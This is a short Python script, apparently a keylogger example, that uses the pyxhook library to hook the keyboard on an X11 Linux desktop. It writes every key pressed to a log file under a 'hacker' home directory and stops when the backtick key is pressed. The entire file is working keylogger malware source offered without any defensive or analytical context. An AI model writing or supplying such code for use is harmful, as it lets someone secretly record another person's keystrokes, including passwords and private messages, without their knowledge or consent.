import pyxhook

#path to the file where the keypress are stored
logfile = '/home/hacker/Desktop/file.log'

#function to write the key pressed in a file
def onkeypress(event):
    file = open(logfile,'a')
    file.write(event.key)
    file.write('\n')

#if '`' key is pressed then the keylogger will exit
    if event.Ascii == 96:
        file.close()
        new.cancel()

#create a class of hookmanager
new = pyxhook.HookManager()

#listen to keystrokes
new.KeyDown = onkeypress

#hook keyboard
new.HookKeyboard()

#start the process
new.start()
